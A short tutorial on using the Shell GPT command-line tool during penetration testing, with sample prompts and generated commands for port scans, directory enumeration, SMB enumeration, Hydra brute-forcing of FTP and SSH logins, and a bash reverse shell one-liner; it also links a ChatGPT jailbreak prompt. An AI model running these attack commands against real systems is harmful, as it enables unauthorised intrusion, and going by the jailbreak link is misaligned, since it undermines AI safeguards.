# 🛠️ Shell GPT Walkthrough for Pentesting

Shell GPT (sgpt) is a CLI tool that integrates OpenAI’s models into your terminal. This walkthrough shows how to use sgpt effectively during pentesting engagements.

---

## ⚙️ Installation

pip install shell-gpt

Set your OpenAI API key:

export OPENAI_API_KEY="your-api-key"

Test it:

sgpt --shell "Hello"

---

## 💡 Usage Examples

### 1. 🔍 Basic Prompt

sgpt --shell "What is the Nmap command to scan all ports?"

**Result:**

nmap -p- 10.10.10.10

---

### 2. 🧠 Shell Mode

Generate raw bash-ready commands:

sgpt --shell "Brute force FTP login with Hydra using rockyou.txt"

**Output:**

hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10

---

### 3. 🛠️ Script Creation

sgpt --shell "Write a bash script to ping all IPs in a subnet"

**Output:**

#!/bin/bash  
for ip in $(seq 1 254); do  
  ping -c 1 192.168.1.$ip | grep "64 bytes" &  
done

---

### 4. 🎯 Reverse Shells

sgpt --shell "Give me a bash reverse shell for 192.168.1.100:4444"

**Output:**

bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

---

### 5. 🛡️ CVE/Exploit Queries

sgpt --shell "Known CVEs for Apache 2.4.49"

**Result:**

- CVE-2021-41773: Path Traversal  
- CVE-2021-42013: RCE

---

## 🧪 Pentest Workflow Example (with sgpt)

# Full port scan  
sgpt --shell "Nmap full scan command"  
→ nmap -p- 10.10.10.10

# Directory enumeration  
sgpt --shell "Gobuster command for web server on port 8080"  
→ gobuster dir -u http://10.10.10.10:8080 -w /usr/share/wordlists/dirb/common.txt

# SSH bruteforce  
sgpt --shell "Hydra command to bruteforce SSH"  
→ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10

# Enum SMB  
sgpt --shell "smbclient command to enumerate shares"  
→ smbclient -L //10.10.10.10 -N

---

## 🧠 Tips

- Always use --shell to get ready-to-run terminal output.  
- Add --code if using in environments where markdown formatting matters.  
- Switch models with --model gpt-3.5-turbo or --model gpt-4.

---
## Refernce
Jailbreaks prompt for chatgpt 
https://gist.github.com/coolaj86/6f4f7b30129b0251f61fa7baaa881516

## 📌 Summary

Shell GPT helps red teamers, bug bounty hunters, and CTF players automate terminal tasks through natural language. It’s fast, contextual, and extremely helpful during reconnaissance, exploitation, and reporting.

---
